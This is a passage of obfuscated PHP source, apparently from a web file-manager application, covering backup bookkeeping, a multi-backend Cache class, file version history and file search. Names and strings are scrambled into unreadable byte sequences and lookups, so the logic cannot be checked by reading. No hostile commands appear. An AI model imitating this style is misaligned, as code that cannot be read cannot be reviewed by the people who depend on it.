1024 * 1024 * 100) { $¶³û–û§ = array($_SERVER[çâ¥×ø³][869] => $×ô¶Üú, $_SERVER[çâ¥×ø³][870] => $²¸‡É¿, $_SERVER[çâ¥×ø³][871] => $ÙÑ²²“ı); Backup::set($¶³û–û§); $üÕùëƒ˜ = $Œ™«ıÈá = 0; } } $Ü›‚ÔÄë = count($–’¨¶ƒ); $ÁşÚ‡‡++; } while ($Ü›‚ÔÄë == $É·—œ); $Ûµ™’§³->end(); $¶³û–û§ = array($_SERVER[çâ¥×ø³][872] => 1, $_SERVER[çâ¥×ø³][810] => time(), $_SERVER[çâ¥×ø³][824] => 1, $_SERVER[çâ¥×ø³][869] => $×ô¶Üú, $_SERVER[çâ¥×ø³][861] => $‡©é¡šİ, $_SERVER[çâ¥×ø³][860] => $õæüµ, $_SERVER[çâ¥×ø³][873] => time()); if ($Œ™«ıÈá) { $¶³û–û§[$_SERVER[çâ¥×ø³][870]] = $²¸‡É¿; $¶³û–û§[$_SERVER[çâ¥×ø³][871]] = $ÙÑ²²“ı; } Backup::set($¶³û–û§); $this->_fileFilter($Ìºº­˜Í); return !0; } private function _fileExist($¹“ØüëÜ, &$¢Ê ½õ, $İïê‘‚) { $¨×ÏŞİ =& $_SERVER[çâ¥×ø³]; $Ç¹şÖ¥‘ = $¹“ØüëÜ[$¨×ÏŞİ[84]]; if (in_array($¹“ØüëÜ[$¨×ÏŞİ[509]], $¢Ê ½õ)) { return !1; } if (!in_array($¹“ØüëÜ[$¨×ÏŞİ[866]], $İïê‘‚)) { return !1; } if (IO::exist($Ç¹şÖ¥‘)) { return !0; } $îàí‘·ş = get_path_father($Ç¹şÖ¥‘); if (IO::exist($îàí‘·ş)) { $¢Ê ½õ[] = $¹“ØüëÜ[$¨×ÏŞİ[509]]; return !1; } $ˆ„´Œ»Û = array($¨×ÏŞİ[866] => $¹“ØüëÜ[$¨×ÏŞİ[866]], $¨×ÏŞİ[84] => array($¨×ÏŞİ[427], "{$îàí‘·ş}\45")); $¦ù•ËÇ = Model($¨×ÏŞİ[838])->where($ˆ„´Œ»Û)->field($¨×ÏŞİ[510])->select(); $¢Ê ½õ = array_merge($¢Ê ½õ, array_to_keyvalue($¦ù•ËÇ, $¨×ÏŞİ[12], $¨×ÏŞİ[509])); return !1; } private function _fileFilter($ŠÑ›áÎ‰) { $ßÙâåˆ¤ =& $_SERVER[çâ¥×ø³]; if (empty($ŠÑ›áÎ‰)) { return; } $ÃÏŒ×ÀÙ = array($ßÙâåˆ¤[509] => array($ßÙâåˆ¤[7], array_unique($ŠÑ›áÎ‰))); $Î—ÃßÛ = Model($ßÙâåˆ¤[874])->where($ÃÏŒ×ÀÙ)->field($ßÙâåˆ¤[181])->select(); foreach ($Î—ÃßÛ as $âò§¦Ó’) { Model($ßÙâåˆ¤[874])->remove($âò§¦Ó’[$ßÙâåˆ¤[181]], !1); } } private function storeIds() { $¶ñ±ñœ =& $_SERVER[çâ¥×ø³]; $¹Ù¯Ÿ»ø = Model($¶ñ±ñœ[816])->listData(); $•–‘ú³Ù = array(); $şê¢ş«¯ = $GLOBALS[$¶ñ±ñœ[6]][$¶ñ±ñœ[89]][$¶ñ±ñœ[875]]; foreach ($¹Ù¯Ÿ»ø as $óÕÆîÃ†) { $ŞÄ¾Ù‘Ê = strtolower($óÕÆîÃ†[$¶ñ±ñœ[95]]); if (!isset($şê¢ş«¯[$ŞÄ¾Ù‘Ê])) { continue; } $Ã²ığ–ü = $¶ñ±ñœ[74] . (isset($şê¢ş«¯[$ŞÄ¾Ù‘Ê]) ? $şê¢ş«¯[$ŞÄ¾Ù‘Ê] : ucfirst($ŞÄ¾Ù‘Ê)); if (!class_exists($Ã²ığ–ü)) { continue; } $•–‘ú³Ù[] = $óÕÆîÃ†[$¶ñ±ñœ[443]]; } return $•–‘ú³Ù; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $ëñšÈ§¥ =& $_SERVER[çâ¥×ø³]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $à“°µ‘ü = $GLOBALS[$ëñšÈ§¥[6]][$ëñšÈ§¥[393]]; $ƒ¹˜ÖÄ“ = $à“°µ‘ü[$à“°µ‘ü[$ëñšÈ§¥[876]]]; $¸ë‡¼î“ = $à“°µ‘ü[$ëñšÈ§¥[877]]; switch ($à“°µ‘ü[$ëñšÈ§¥[876]]) { case $ëñšÈ§¥[21]: self::$handle = Model($ëñšÈ§¥[878]); break; case $ëñšÈ§¥[879]: self::$handle = new CacheRedis($ƒ¹˜ÖÄ“, $¸ë‡¼î“); break; case $ëñšÈ§¥[880]: self::$handle = new CacheMemcached($ƒ¹˜ÖÄ“, $¸ë‡¼î“); break; case $ëñšÈ§¥[214]: self::$handle = new CacheFile($ƒ¹˜ÖÄ“, $¸ë‡¼î“); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($­Ø´¬€§) { if (is_array($­Ø´¬€§) || is_object($­Ø´¬€§)) { $­Ø´¬€§ = json_encode($­Ø´¬€§); } $­Ø´¬€§ = rawurlencode($­Ø´¬€§); return md5(KOD_SITE_ID . $_SERVER[çâ¥×ø³][11] . $­Ø´¬€§); } public static function get($Œò­ÊÃ¢, $¸õ™¢½„ = false) { $‹©Õ¯Óˆ = self::key($Œò­ÊÃ¢); $ºÛíéÚ = self::init(); if ($¸õ™¢½„) { return unserialize($ºÛíéÚ->get($‹©Õ¯Óˆ)); } if (!isset(self::$memoryCache[$‹©Õ¯Óˆ])) { $üÅ˜«ïÑ = $ºÛíéÚ->get($‹©Õ¯Óˆ); self::$memoryCache[$‹©Õ¯Óˆ] = unserialize($üÅ˜«ïÑ); } return self::$memoryCache[$‹©Õ¯Óˆ]; } public static function set($ÛªøÍŸ¤, $ÑÄüä¨Ù, $Ò¤ú›üœ = false) { $é»•—ì =& $_SERVER[çâ¥×ø³]; $şÆÀÛº¾ = self::key($ÛªøÍŸ¤); if (isset(self::$memoryCache[$şÆÀÛº¾]) && self::$memoryCache[$şÆÀÛº¾] === $ÑÄüä¨Ù) { return !0; } if ($Ò¤ú›üœ === 0) { self::$memoryCache[$şÆÀÛº¾] = $ÑÄüä¨Ù; return !0; } $±£ÀÑñï = self::init(); $Ùøùé±æ = serialize($ÑÄüä¨Ù); CacheLock::lock($ÛªøÍŸ¤ . $é»•—ì[881]); $›Âè‡ñè = $±£ÀÑñï->set($şÆÀÛº¾, $Ùøùé±æ, $Ò¤ú›üœ); self::$memoryCache[$şÆÀÛº¾] = $ÑÄüä¨Ù; CacheLock::unlock($ÛªøÍŸ¤ . $é»•—ì[881]); return $›Âè‡ñè; } public static function getCall($­ì‚‹Ãì, $‚³‰™Ãâ, $ŠòÏ¢öù, $öş„É÷´ = array()) { $ÜÁê”©£ =& $_SERVER[çâ¥×ø³]; $ú×ƒÅó = self::get($­ì‚‹Ãì); if ($ú×ƒÅó || $ú×ƒÅó === $ÜÁê”©£[12]) { return $ú×ƒÅó; } $ú×ƒÅó = call_user_func_array($ŠòÏ¢öù, $öş„É÷´); $ú×ƒÅó = $ú×ƒÅó ? $ú×ƒÅó : $ÜÁê”©£[12]; self::set($­ì‚‹Ãì, $ú×ƒÅó, $‚³‰™Ãâ); return $ú×ƒÅó; } public static function remove($¶‹•œÚ) { $¸ÉÅóË¡ = self::key($¶‹•œÚ); unset(self::$memoryCache[$¸ÉÅóË¡]); self::clearTimeout(); CacheLock::lock($¶‹•œÚ); $ßâˆ“« = self::init()->remove($¸ÉÅóË¡); CacheLock::unlock($¶‹•œÚ); return $ßâˆ“«; } public static function removeMemory($ì²…¯î×) { $£†È§‰² = self::key($ì²…¯î×); unset(self::$memoryCache[$£†È§‰²]); } public static function clearMemory($ŞÈªşñ = false) { if ($ŞÈªşñ) { $ŞÈªşñ = self::key($ŞÈªşñ); unset(self::$memoryCache[$ŞÈªşñ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[çâ¥×ø³][882])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[çâ¥×ø³][883])) { self::init()->clearTimeout(); } } } goto D•‰›áŞô; cÔ»êØÒÒ¹: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\165\x72\143\x65\137\x68\151\163\164\157\x72\171"; public function historyCount($œšæï) { $ñÂ„¼ÍÔ =& $_SERVER[çâ¥×ø³]; if (!$œšæï) { return array(); } if (is_string($œšæï) || is_int($œšæï)) { $œšæï = array($œšæï); } $úÅ¶›áŒ = array($ñÂ„¼ÍÔ[181], $ñÂ„¼ÍÔ[1932] => $ñÂ„¼ÍÔ[533]); $©àÆèÄ‹ = array($ñÂ„¼ÍÔ[181] => array($ñÂ„¼ÍÔ[7], $œšæï)); $Ä¡£¢àœ = $this->field($úÅ¶›áŒ)->where($©àÆèÄ‹)->group($ñÂ„¼ÍÔ[181])->select(); return array_to_keyvalue($Ä¡£¢àœ, $ñÂ„¼ÍÔ[181], $ñÂ„¼ÍÔ[533]); } public function addHistory($¶®ÃÓ–€, $¶¨Æ™¸ = '') { $™­Ã‹ş© =& $_SERVER[çâ¥×ø³]; $˜Ê°Ü®í = array($™­Ã‹ş©[459] => $¶®ÃÓ–€[$™­Ã‹ş©[181]], $™­Ã‹ş©[1692] => isset($¶®ÃÓ–€[$™­Ã‹ş©[497]]) ? $¶®ÃÓ–€[$™­Ã‹ş©[497]] : $¶®ÃÓ–€[$™­Ã‹ş©[495]], $™­Ã‹ş©[510] => $¶®ÃÓ–€[$™­Ã‹ş©[509]], $™­Ã‹ş©[585] => $¶®ÃÓ–€[$™­Ã‹ş©[76]], $™­Ã‹ş©[2143] => $¶¨Æ™¸); if ($GLOBALS[$™­Ã‹ş©[6]][$™­Ã‹ş©[89]][$™­Ã‹ş©[1270]] >= 1) { $this->historyAutoClear($˜Ê°Ü®í[$™­Ã‹ş©[181]]); $this->add($˜Ê°Ü®í); } Hook::trigger($™­Ã‹ş©[2144], $˜Ê°Ü®í); Model($™­Ã‹ş©[2145])->eventFileEdit($¶®ÃÓ–€[$™­Ã‹ş©[181]]); } private function historyAutoClear($§€İì—Œ) { $¤ÓëêÌû =& $_SERVER[çâ¥×ø³]; $ıÇÛ«¢ü = Model($¤ÓëêÌû[819])->get($¤ÓëêÌû[1292]); $š¥ìİ‘Ò = $GLOBALS[$¤ÓëêÌû[6]][$¤ÓëêÌû[89]][$¤ÓëêÌû[1270]]; $´‰òğ©¼ = $ıÇÛ«¢ü == $¤ÓëêÌû[1293] ? min(5, $š¥ìİ‘Ò) : $š¥ìİ‘Ò; $´‰òğ©¼ = $´‰òğ©¼ <= 0 ? 0 : $´‰òğ©¼ - 1; if ($´‰òğ©¼ >= 500) { return; } $›ÈÄ®ôË = array($¤ÓëêÌû[459] => $§€İì—Œ); $†ëÜÆ³ = $this->field($¤ÓëêÌû[2146])->where($›ÈÄ®ôË)->order($¤ÓëêÌû[2140])->select(); if (!$†ëÜÆ³ || $´‰òğ©¼ >= count($†ëÜÆ³)) { return; } $ãŒºâ–õ = array_to_keyvalue($†ëÜÆ³, $¤ÓëêÌû[12], $¤ÓëêÌû[443]); $ãŒºâ–õ = array_slice($ãŒºâ–õ, $´‰òğ©¼); $”æŞ±µ£ = array_to_keyvalue($†ëÜÆ³, $¤ÓëêÌû[12], $¤ÓëêÌû[509]); $”æŞ±µ£ = array_slice($”æŞ±µ£, $´‰òğ©¼); if (!$ãŒºâ–õ || !$”æŞ±µ£) { return; } $›ÈÄ®ôË = array($¤ÓëêÌû[461] => array($¤ÓëêÌû[7], $ãŒºâ–õ)); $this->where($›ÈÄ®ôË)->delete(); Model($¤ÓëêÌû[512])->remove($”æŞ±µ£); } public function listData($±Ş¶“’Ù) { $îê°Ø¬Î =& $_SERVER[çâ¥×ø³]; $ªÎé€•˜ = array($îê°Ø¬Î[459] => $±Ş¶“’Ù); $á¾æƒ = $îê°Ø¬Î[2147]; $ä¦¢áæó = $this->field($á¾æƒ)->where($ªÎé€•˜)->order($îê°Ø¬Î[2140])->selectPage(); $this->_listAppendUser($ä¦¢áæó[$îê°Ø¬Î[413]]); $„æÃ™œ = Model($îê°Ø¬Î[819])->get($îê°Ø¬Î[1292]); $Óê¢”•÷ = 5; if ($„æÃ™œ == $îê°Ø¬Î[1293]) { $ä¦¢áæó[$îê°Ø¬Î[413]] = array_slice($ä¦¢áæó[$îê°Ø¬Î[413]], 0, $Óê¢”•÷); $ä¦¢áæó[$îê°Ø¬Î[410]] = array($îê°Ø¬Î[2148] => 1, $îê°Ø¬Î[2149] => 20, $îê°Ø¬Î[2150] => 1, $îê°Ø¬Î[2151] => count($ä¦¢áæó[$îê°Ø¬Î[413]])); } return $ä¦¢áæó; } protected function _listAppendUser(&$¦¥ö©óĞ) { $³î–Š‡Ï =& $_SERVER[çâ¥×ø³]; $†Ëü›õ¯ = array_to_keyvalue($¦¥ö©óĞ, $³î–Š‡Ï[12], $³î–Š‡Ï[1701]); $Šª‹˜‰¯ = Model($³î–Š‡Ï[567])->userListInfo($†Ëü›õ¯); foreach ($¦¥ö©óĞ as &$Å½¨üõ) { $¢áõ‰ï” = $Å½¨üõ[$³î–Š‡Ï[1701]]; $Å½¨üõ[$³î–Š‡Ï[495]] = $Šª‹˜‰¯[$¢áõ‰ï”] ? $Šª‹˜‰¯[$¢áõ‰ï”] : !1; } unset($Å½¨üõ); } public function fileInfo($‘ó¿) { $›Ş¬Â×À =& $_SERVER[çâ¥×ø³]; $Ä›Ğà„ = $this->tablePrefix; $ÑÌü¬’¯ = "{$Ä›Ğà„}\x69\x6f\x5f\146\x69\x6c\145\x20\x66\151\x6c\x65\163\x20\157\x6e\x20\x66\151\154\x65\x73\56\146\151\x6c\x65\111\x44\x20\75\40\x68\x69\x73\164\157\x72\171\x2e\146\151\154\x65\x49\104"; return $this->alias($›Ş¬Â×À[2152])->where(array($›Ş¬Â×À[461] => $‘ó¿))->join($ÑÌü¬’¯, $›Ş¬Â×À[2153])->find(); } public function removeItem($€Ş†ˆ£ó) { $Œ…‰Îƒğ =& $_SERVER[çâ¥×ø³]; $È¦åÄèî = array($Œ…‰Îƒğ[461] => $€Ş†ˆ£ó); $¸Äîç— = $this->where($È¦åÄèî)->find(); if ($¸Äîç—) { $ÄÎ•°ëÉ = $this->where($È¦åÄèî)->delete(); Model($Œ…‰Îƒğ[512])->remove($¸Äîç—[$Œ…‰Îƒğ[509]]); return $ÄÎ•°ëÉ; } return !1; } public function removeBySource($¾ŸËÎÑ„) { $³ÁÈ…¸™ =& $_SERVER[çâ¥×ø³]; if (!$¾ŸËÎÑ„) { return !1; } if (!is_array($¾ŸËÎÑ„)) { $¾ŸËÎÑ„ = array($¾ŸËÎÑ„); } $…ÍÓÖÁ¸ = array($³ÁÈ…¸™[459] => array($³ÁÈ…¸™[7], $¾ŸËÎÑ„)); $şûÜˆò¤ = $this->field($³ÁÈ…¸™[510])->where($…ÍÓÖÁ¸)->select(); if ($şûÜˆò¤) { $this->where($…ÍÓÖÁ¸)->delete(); $­Ú¢øúŞ = array_to_keyvalue($şûÜˆò¤, $³ÁÈ…¸™[12], $³ÁÈ…¸™[509]); Model($³ÁÈ…¸™[512])->remove($­Ú¢øúŞ); } return !0; } public function setDetail($İøôæ–¦, $ˆ«ÎõÌ) { $ÉÕÜ…÷¸ =& $_SERVER[çâ¥×ø³]; return $this->where(array($ÉÕÜ…÷¸[461] => $İøôæ–¦))->save(array($ÉÕÜ…÷¸[2143] => $ˆ«ÎõÌ)); } public function rollbackToItem($í¯Àîğ, $Ã¸ç²÷) { $Ä„ñàì× =& $_SERVER[çâ¥×ø³]; $Ëå¸Ì„³ = Model($Ä„ñàì×[874])->sourceInfo($í¯Àîğ); $this->addHistory($Ëå¸Ì„³, LNG($Ä„ñàì×[2154])); $çİùÌ­ê = $this->find($Ã¸ç²÷); $õˆÆÃˆî = array($Ä„ñàì×[509] => $çİùÌ­ê[$Ä„ñàì×[509]], $Ä„ñàì×[76] => $çİùÌ­ê[$Ä„ñàì×[76]], $Ä„ñàì×[85] => time(), $Ä„ñàì×[497] => USER_ID); Model($Ä„ñàì×[874])->where(array($Ä„ñàì×[181] => $í¯Àîğ))->save($õˆÆÃˆî); return $this->where(array($Ä„ñàì×[461] => $Ã¸ç²÷))->delete(); } public function clearSame($ïÌåØôÕ) { $—Í‘Œ× =& $_SERVER[çâ¥×ø³]; $…®˜“ã = $this->listData($ïÌåØôÕ); $¸µŞÎÎ± = array_to_keyvalue_group($…®˜“ã, $—Í‘Œ×[509]); $áõºş§¼ = array(); $„ú–Ğü© = array(); foreach ($¸µŞÎÎ± as $¤çı÷Âç) { if (!$¤çı÷Âç || count($¤çı÷Âç) <= 1) { continue; } foreach ($¤çı÷Âç as $õı¹½Êç) { $áõºş§¼[] = $õı¹½Êç[$—Í‘Œ×[509]]; $„ú–Ğü©[] = $õı¹½Êç[$—Í‘Œ×[443]]; } } if (!$„ú–Ğü©) { return; } $this->where(array($—Í‘Œ×[443] => array($—Í‘Œ×[7], $„ú–Ğü©)))->delete(); Model($—Í‘Œ×[512])->remove($áõºş§¼); } public function userSpace() { $†‡û¬ö” =& $_SERVER[çâ¥×ø³]; $Ÿë çÀã = $this->tablePrefix; $òŠô©å¼ = array($†‡û¬ö”[1692] => USER_ID); $Î‰…éÉ« = "{$Ÿë çÀã}\x69\x6f\137\x66\151\154\x65\40\146\x69\154\145\x73\40\x6f\156\40\x66\151\x6c\145\x73\x2e\x66\x69\x6c\145\x49\x44\x20\75\40\x68\151\x73\164\x6f\x72\171\56\146\x69\154\145\111\x44"; return $this->alias($†‡û¬ö”[2152])->where($òŠô©å¼)->join($Î‰…éÉ«, $†‡û¬ö”[2153])->sum($†‡û¬ö”[76]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ªşÄˆÛĞ) { $¥›±˜éú =& $_SERVER[çâ¥×ø³]; $®ãúÊèÍ = KodIO::fileTypeList(); $ÚÃÏÊ¢ = $®ãúÊèÍ[$ªşÄˆÛĞ]; if (!$ÚÃÏÊ¢) { return array(); } $ÕÁş¯½Î = $ÚÃÏÊ¢[$¥›±˜éú[175]]; $•‰†Ôî¯ = $¥›±˜éú[7]; if (!$ÚÃÏÊ¢[$¥›±˜éú[175]]) { $ß¨¥ÅÛŸ = array_to_keyvalue($®ãúÊèÍ, $¥›±˜éú[12], $¥›±˜éú[175]); $ÕÁş¯½Î = implode($¥›±˜éú[50], $ß¨¥ÅÛŸ); $•‰†Ôî¯ = $¥›±˜éú[2155]; } $±¡ÕÑŞÆ = explode($¥›±˜éú[50], trim($ÕÁş¯½Î, $¥›±˜éú[50])); return array($•‰†Ôî¯, $±¡ÕÑŞÆ); } public function listPathType($¾¢ÓšÏ‡) { $–«†òì =& $_SERVER[çâ¥×ø³]; $œ¨¦¾ö£ = $this->fileTypeWhere($¾¢ÓšÏ‡); if (!$œ¨¦¾ö£) { return array(); } $äç ÉŒõ = USER_ID; $ß¬öÁË† = Model($–«†òì[567])->getInfo($äç ÉŒõ); $Á—ä›±ì = array($–«†òì[616] => SourceModel::TYPE_USER, $–«†òì[553] => array($–«†òì[580], $–«†òì[563] . $ß¬öÁË†[$–«†òì[87]][$–«†òì[181]] . $–«†òì[581]), $–«†òì[617] => $äç ÉŒõ, $–«†òì[614] => 0, $–«†òì[615] => $œ¨¦¾ö£); return $this->listSource($Á—ä›±ì); } public function listSearch($Ô¯’úø, $ï©ÆÒÔ = 300) { $Ü¾åúöÒ =& $_SERVER[çâ¥×ø³]; if (isset($Ô¯’úø[$Ü¾åúöÒ[1993]]) && $Ô¯’úø[$Ü¾åúöÒ[1993]]) { $Ô¯’úø[$Ü¾åúöÒ[1993]] = str_replace($Ü¾åúöÒ[428], $Ü¾åúöÒ[2156], trim($Ô¯’úø[$Ü¾åúöÒ[1993]])); } $—ïöë‘Â = $this->_parseSearchWhere($Ô¯’úø); if (!isset($—ïöë‘Â[$Ü¾åúöÒ[473]])) { $—ïöë‘Â[$Ü¾åúöÒ[473]] = 0; } $ó¡¾‚˜º = $Ü¾åúöÒ[2157]; $Î‰€¯ä‚ = $—ïöë‘Â; $êØÕ°û = $ó¡¾‚˜º; $this->_listSearchBindPinyin($Ô¯’úø, $—ïöë‘Â, $ó¡¾‚˜º); $this->alias($Ü¾åúöÒ[487])->_makeOrder(); $—ïöë‘Â = $this->parseWhereLike($—ïöë‘Â); $‹¸üŠ´£ = $this->distinct(!0)->field($ó¡¾‚˜º)->where($—ïöë‘Â)->selectPage($ï©ÆÒÔ); if ($GLOBALS[$Ü¾åúöÒ[6]][$Ü¾åúöÒ[425]][$Ü¾åúöÒ[426]] && Input::check($Ô¯’úø[$Ü¾åúöÒ[1993]], $Ü¾åúöÒ[623]) && $‹¸üŠ´£[$Ü¾åúöÒ[410]][$Ü¾åúöÒ[397]] == 1 && $‹¸üŠ´£[$Ü¾åúöÒ[410]][$Ü¾åúöÒ[411]] == 0) { $‹¸üŠ´£ = $this->distinct(!0)->field($ó¡¾‚˜º)->where($Î‰€¯ä‚)->limit(1000)->select(); $‹¸üŠ´£ = array_page_split($‹¸üŠ´£, !1, $ï©ÆÒÔ); } $this->_listSearchFileContent($‹¸üŠ´£, $Ô¯’úø, $êØÕ°û, $Î‰€¯ä‚); $this->_listSearchDesc($‹¸üŠ´£, $Ô¯’úø, $êØÕ°û); $this->_listSearchTag($‹¸üŠ´£, $Ô¯’úø, $êØÕ°û); $this->_listSearchGroupTag($‹¸üŠ´£, $Ô¯’úø, $êØÕ°û); $this->_listDataApply($‹¸üŠ´£[$Ü¾åúöÒ[413]]); $this->_listMake($‹¸üŠ´£); return $‹¸üŠ´£; } private function _listSearchFileContent(&$¶´ô£Ò, $çñî®õÔ, $ûİ‡ê‰¯, $ÉÔßñˆ ) { $â¤®Ë¸ç =& $_SERVER[çâ¥×ø³]; if (!$çñî®õÔ[$â¤®Ë¸ç[1993]] || $¶´ô£Ò[$â¤®Ë¸ç[410]][$â¤®Ë¸ç[397]] > 1) { return; } if (!isset($ÉÔßñˆ [$â¤®Ë¸ç[32]]) || !is_array($çñî®õÔ[$â¤®Ë¸ç[509]])) { return; } $ÉÔßñˆ [$â¤®Ë¸ç[509]] = array($â¤®Ë¸ç[7], $çñî®õÔ[$â¤®Ë¸ç[509]]); unset($ÉÔßñˆ [$â¤®Ë¸ç[32]]); unset($çñî®õÔ[$â¤®Ë¸ç[509]]); $ˆ†ö‘â = $this->field($ûİ‡ê‰¯)->where($ÉÔßñˆ )->limit($â¤®Ë¸ç[2158])->select(); if (!$ˆ†ö‘â || count($ˆ†ö‘â) == 0) { return; } $¶´ô£Ò[$â¤®Ë¸ç[413]] = array_merge($ˆ†ö‘â, $¶´ô£Ò[$â¤®Ë¸ç[413]]); $¶´ô£Ò[$â¤®Ë¸ç[410]][$â¤®Ë¸ç[411]] += count($ˆ†ö‘â); } private function _listSearchTag(&$ÉÛüƒ¦Â, $Èâ½óÆ», $Æ•Û£³õ) { $–±øÇŸë =& $_SERVER[çâ¥×ø³]; if (!$Èâ½óÆ»[$–±øÇŸë[1993]] || $ÉÛüƒ¦Â[$–±øÇŸë[410]][$–±øÇŸë[397]] > 1) { return; } $š‰½¯İ¼ = Model($–±øÇŸë[2159])->listData(); $æàµÁÒó = array(); $ô‚¡Ë = $Èâ½óÆ»[$–±øÇŸë[1993]]; foreach ($š‰½¯İ¼ as $áüˆ›Ñş) { $ƒ®Ë‰–Ó = $áüˆ›Ñş[$–±øÇŸë[32]]; $Ù‰ÏÇ = str_replace($–±øÇŸë[53], $–±øÇŸë[12], Pinyin::get($ƒ®Ë‰–Ó)); if (stripos($ƒ®Ë‰–Ó, $ô‚¡Ë) !== !1 || stripos($Ù‰ÏÇ, $ô‚¡Ë) !== !1) { $æàµÁÒó[] = $áüˆ›Ñş[$–±øÇŸë[443]]; } } if (!$æàµÁÒó) { return; } $¾­í˜÷Õ = array($–±øÇŸë[468] => array($–±øÇŸë[7], $æàµÁÒó), $–±øÇŸë[1701] => USER_ID); $”àÉ·î¤ = Model($–±øÇŸë[470])->field($–±øÇŸë[84])->where($¾­í˜÷Õ)->select(); $”àÉ·î¤ = array_to_keyvalue($”àÉ·î¤, $–±øÇŸë[12], $–±øÇŸë[84]); $ƒ©Ïíİ = array_unique($”àÉ·î¤); $this->_listSearchMerge($ÉÛüƒ¦Â, $Èâ½óÆ», $Æ•Û£³õ, $ƒ©Ïíİ); } private function _listSearchDesc(&$²ÇÊìÄ, $ú«ÌÇÙó, $ªàé‹ñ€) { $‹ƒ•÷í =& $_SERVER[çâ¥×ø³]; if (!$ú«ÌÇÙó[$‹ƒ•÷í[1993]] || $²ÇÊìÄ[$‹ƒ•÷í[410]][$‹ƒ•÷í[397]] > 1) { return; } $Ã…Í´¬Ñ = array($‹ƒ•÷í[94] => $‹ƒ•÷í[494], $‹ƒ•÷í[418] => array($‹ƒ•÷í[427], $‹ƒ•÷í[1995] . $ú«ÌÇÙó[$‹ƒ•÷í[1993]] . $‹ƒ•÷í[1995])); $ô·°ô¼ = !1; if ($ô·°ô¼) { $å»î‘” = $this->listSearchChildren($ú«ÌÇÙó[$‹ƒ•÷í[180]]); $å»î‘” = array_unique($å»î‘”); if (!$å»î‘”) { return; } $Ã…Í´¬Ñ[$‹ƒ•÷í[181]] = array($‹ƒ•÷í[7], $å»î‘”); } $ñåÃ¨•à = Model($‹ƒ•÷í[600])->field($‹ƒ•÷í[181])->where($Ã…Í´¬Ñ)->limit(5000)->select(); $Æè¦µß“ = array_to_keyvalue($ñåÃ¨•à, $‹ƒ•÷í[12], $‹ƒ•÷í[181]); $this->_listSearchMerge($²ÇÊìÄ, $ú«ÌÇÙó, $ªàé‹ñ€, $Æè¦µß“); } private function _listSearchGroupTag(&$¤ÁˆÏ‰„, $…ŠÈŒòü, $›¥õ®÷) { $Õ×Öœ¿‹ =& $_SERVER[çâ¥×ø³]; if (!$…ŠÈŒòü[$Õ×Öœ¿‹[1993]] || $¤ÁˆÏ‰„[$Õ×Öœ¿‹[410]][$Õ×Öœ¿‹[397]] > 1 || !$…ŠÈŒòü[$Õ×Öœ¿‹[180]]) { return; } $Ôë¥ŒŸ´ = $this->sourceInfo($…ŠÈŒòü[$Õ×Öœ¿‹[180]]); if (!$Ôë¥ŒŸ´ || $Ôë¥ŒŸ´[$Õ×Öœ¿‹[178]] != SourceModel::TYPE_GROUP) { return; } $Å†©øãÍ = $Ôë¥ŒŸ´[$Õ×Öœ¿‹[538]]; $òÌ¸Šê = Model($Õ×Öœ¿‹[2160])->get($Å†©øãÍ); $±’·¬‘ = array(); $ÃŸÂ’¼ = $…ŠÈŒòü[$Õ×Öœ¿‹[1993]]; foreach ($òÌ¸Šê[$Õ×Öœ¿‹[413]] as $Ê¬Ä‰ƒœ) { $´’‘®í = $Ê¬Ä‰ƒœ[$Õ×Öœ¿‹[32]]; $œ¤Âø– = str_replace($Õ×Öœ¿‹[53], $Õ×Öœ¿‹[12], Pinyin::get($´’‘®í)); if (stripos($´’‘®í, $ÃŸÂ’¼) !== !1 || stripos($œ¤Âø–, $ÃŸÂ’¼) !== !1) { $±’·¬‘[] = $Ê¬Ä‰ƒœ[$Õ×Öœ¿‹[443]]; } } if (!$±’·¬‘) { return; } $¸ı×™À = array($Õ×Öœ¿‹[468] => array($Õ×Öœ¿‹[7], $±’·¬‘), $Õ×Öœ¿‹[1701] => 0, $Õ×Öœ¿‹[33] => $Õ×Öœ¿‹[2015] . $Å†©øãÍ); $¬ôÖ×íÃ = Model($Õ×Öœ¿‹[470])->field($Õ×Öœ¿‹[84])->where($¸ı×™À)->select(); $¬ôÖ×íÃ = array_to_keyvalue($¬ôÖ×íÃ, $Õ×Öœ¿‹[12], $Õ×Öœ¿‹[84]); $”Ö·¿´ = array_unique($¬ôÖ×íÃ); $this->_listSearchMerge($¤ÁˆÏ‰„, $…ŠÈŒòü, $›¥õ®÷, $”Ö·¿´); } private function _listSearchMerge(&$ì€ˆÇúÃ, $Ì‹„²², $…€Ç˜ƒ³, $èñ¼·ø—) { $´úşÂ·´ =& $_SERVER[çâ¥×ø³]; if (!$èñ¼·ø—) { return; } $²ñæ¹º¬ = array_to_keyvalue($ì€ˆÇúÃ[$´úşÂ·´[413]], $´úşÂ·´[12], $´úşÂ·´[181]); $É¿¶ú„¬ = array_diff($èñ¼·ø—, $²ñæ¹º¬); if (!$É¿¶ú„¬) { return; } $ıë¸¦¶— = array($´úşÂ·´[181] => array($´úşÂ·´[7], $É¿¶ú„¬)); $Úâ¸æÓŞ = $this->field($…€Ç˜ƒ³)->where($ıë¸¦¶—)->select(); if (!$Úâ¸æÓŞ) { return; } $Åôµ¬ö¯ = array(); foreach ($Úâ¸æÓŞ as $€òŠÌ¬) { if ($this->_listSearchFilter($€òŠÌ¬, $Ì‹„²²)) { $Åôµ¬ö¯[] = $€òŠÌ¬; } } $ì€ˆÇúÃ[$´úşÂ·´[413]] = array_merge($Åôµ¬ö¯, $ì€ˆÇúÃ[$´úşÂ·´[413]]); $ì€ˆÇúÃ[$´úşÂ·´[410]][$´úşÂ·´[411]] += count($Åôµ¬ö¯); } private function _listSearchFilter($‹÷õ«‹Ş, $è°êùŞì) { $ò‚ï“»® =& $_SERVER[çâ¥×ø³]; $˜¢šş÷Œ = $‹÷õ«‹Ş[$ò‚ï“»®[453]] == $ò‚ï“»®[88]; if (!strstr($‹÷õ«‹Ş[$ò‚ï“»®[553]], $ò‚ï“»®[50] . $è°êùŞì[$ò‚ï“»®[180]] . $ò‚ï“»®[50])) { return !1; } if (isset($è°êùŞì[$ò‚ï“»®[454]]) && 